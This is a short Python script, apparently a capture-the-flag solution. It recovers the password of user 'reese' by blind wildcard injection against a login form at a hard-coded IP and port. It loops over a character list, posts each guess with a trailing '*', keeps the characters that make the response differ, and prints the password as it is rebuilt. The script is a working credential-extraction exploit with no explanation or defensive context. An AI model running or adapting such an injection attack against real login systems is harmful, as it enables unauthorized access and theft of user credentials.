#!/usr/bin/python
import requests 


chars=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u'
,'v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R',
'S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0',',',';',':','!','?'
,'.','/','§','ù','%','µ','$','£','+','=','°',')','@','ç','_','è','-','(','{','"','#','é','~'
,'&','[','|','`','^','<','>',"'","}"]

url='http://167.71.139.192:30427/login'
cred={'username':'reese', 'password': ' '}
passwd=''

secret=True
while secret:
	secret=False
	for c in chars:
		cred['password']=passwd+ c+ '*' 
		r=requests.post(url,data=cred)
		if ('No search results.' in r.text):
			passwd+=c
			secret=True
			print(passwd)
			break
